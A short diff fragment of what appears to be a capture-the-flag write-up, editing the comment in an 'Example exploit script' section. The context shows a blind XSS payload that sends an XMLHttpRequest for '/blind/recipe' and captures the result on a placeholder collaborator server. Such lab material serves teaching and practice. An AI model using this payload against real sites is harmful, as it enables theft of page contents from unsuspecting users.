@@ -55,7 +55,7 @@ Example exploit script
 ```jsx
 <script>
     exfil = new XMLHttpRequest();
-    // Set the correct server below e.g <https://abcdefg.ctfio.com>
+    // Set the correct server below e.g https://abcdefg.ctfio.com
     exfil.open("GET","{server}/blind/recipe");
     exfil.send();
     // put your colab instance below to you can capture the contents of /blind/recipe
